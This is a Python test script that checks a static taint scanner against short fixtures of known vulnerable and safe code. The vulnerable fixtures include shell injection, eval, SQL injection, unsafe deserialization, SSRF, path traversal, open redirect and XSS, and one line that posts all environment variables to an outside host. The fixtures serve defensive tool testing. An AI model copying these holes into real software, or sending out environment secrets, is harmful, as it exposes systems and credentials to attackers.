"""Framework-level taint audit: realistic cross-line vulns (should be CAUGHT) and
safe variants (should be CLEAN), across sink variants and input sources. Prints
MISSES (false negatives) and FPs so gaps can be fixed at the spec/engine level."""
import subprocess, tempfile, os

BIN = "/Users/akash.s/Desktop/projects/peephole/bin/peephole-darwin-arm64"

# (name, ext, code, expect_cwe or None-for-clean)
CASES = [
    # --- command injection: subprocess variants (os.system covered; these may not be) ---
    ("subprocess.run shell=True", "py", "cmd=request.args.get('c')\nsubprocess.run(cmd, shell=True)\n", "CWE-78"),
    ("subprocess.call shell=True", "py", "cmd='ping '+request.args.get('h')\nsubprocess.call(cmd, shell=True)\n", "CWE-78"),
    ("subprocess.Popen shell=True", "py", "cmd=request.args.get('c')\nsubprocess.Popen(cmd, shell=True)\n", "CWE-78"),
    ("subprocess.check_output shell", "py", "cmd=request.args.get('c')\nsubprocess.check_output(cmd, shell=True)\n", "CWE-78"),
    ("subprocess safe argv", "py", "subprocess.run(['ls','-la'], shell=False)\n", None),
    # --- code injection variants ---
    ("compile()", "py", "src=request.args.get('s')\nexec(compile(src,'<s>','exec'))\n", "CWE-94"),
    ("eval single", "py", "e=request.args.get('e')\neval(e)\n", "CWE-94"),
    # --- SQLi variants ---
    ("execute f-string", "py", "uid=request.args.get('id')\nq=f'SELECT * FROM u WHERE id={uid}'\ncur.execute(q)\n", "CWE-89"),
    ("execute concat", "py", "uid=request.args.get('id')\nq='SELECT * FROM u WHERE id='+uid\ncur.execute(q)\n", "CWE-89"),
    ("execute parameterized", "py", "q='SELECT * FROM u WHERE id=?'\ncur.execute(q,(request.args.get('id'),))\n", None),
    # --- deserialization ---
    ("pickle.loads user", "py", "d=request.data\npickle.loads(d)\n", "CWE-502"),
    ("yaml.load user", "py", "d=request.data\nyaml.load(d)\n", "CWE-502"),
    # --- SSRF ---
    ("requests.get user", "py", "u=request.args.get('url')\nrequests.get(u)\n", "CWE-918"),
    ("requests.get const", "py", "requests.get('https://api.internal/x')\n", None),
    # --- path traversal ---
    ("open user", "py", "fn=request.args.get('f')\nopen(fn).read()\n", "CWE-22"),
    ("open os.path.join user", "py", "fn=request.args.get('f')\np=os.path.join('/data',fn)\nopen(p).read()\n", "CWE-22"),
    ("open secure_filename", "py", "fn=secure_filename(request.args.get('f'))\nopen(fn).read()\n", None),
    # --- open redirect ---
    ("redirect user", "py", "d=request.args.get('next')\nreturn redirect(d)\n", "CWE-601"),
    ("django HttpResponseRedirect", "py", "d=request.GET.get('next')\nreturn HttpResponseRedirect(d)\n", "CWE-601"),
    # --- sources: django/fastapi/flask-json ---
    ("django request.POST -> sql", "py", "uid=request.POST.get('id')\nq=f'SELECT {uid}'\ncur.execute(q)\n", "CWE-89"),
    ("request.json -> eval", "py", "e=request.json['expr']\neval(e)\n", "CWE-94"),
    ("request.get_json -> system", "py", "c=request.get_json()['cmd']\nos.system(c)\n", "CWE-78"),
    # --- sensitive log / exfil ---
    ("log password var", "py", "pw=request.form['password']\nlogger.info(pw)\n", "CWE-532"),
    ("exfil env", "py", "e=dict(os.environ)\nrequests.post('https://x/c',json=e)\n", "CWE-200"),
    # --- XSS ---
    ("innerHTML template literal", "js", "const m=`<b>${u}</b>`\nel.innerHTML=m\n", "CWE-79"),
    ("react dangerouslySetInnerHTML", "js", "msg=`<b>${document.location.hash}</b>`\nreturn <div dangerouslySetInnerHTML={{__html: msg}}/>\n", "CWE-79"),
]


def scan(ext, code):
    d = tempfile.mkdtemp()
    p = os.path.join(d, "f." + ext)
    open(p, "w").write(code)
    out = subprocess.run([BIN, "scan", p], capture_output=True, text=True).stdout
    cwes = set()
    for ln in out.splitlines():
        if ": CWE-" in ln:
            cwes.add(ln.split("CWE-")[1].split(" ")[0])
    return {"CWE-" + c for c in cwes}


misses, fps, ok = [], [], 0
for name, ext, code, expect in CASES:
    got = scan(ext, code)
    if expect:
        if expect in got:
            ok += 1
        else:
            misses.append((name, expect, got))
    else:
        if got:
            fps.append((name, got))
        else:
            ok += 1

print(f"PASS {ok}/{len(CASES)}")
print(f"\nMISSES (false negatives, {len(misses)}):")
for n, e, g in misses:
    print(f"  {n}: expected {e}, got {sorted(g) or 'nothing'}")
print(f"\nFALSE POSITIVES ({len(fps)}):")
for n, g in fps:
    print(f"  {n}: flagged {sorted(g)}")
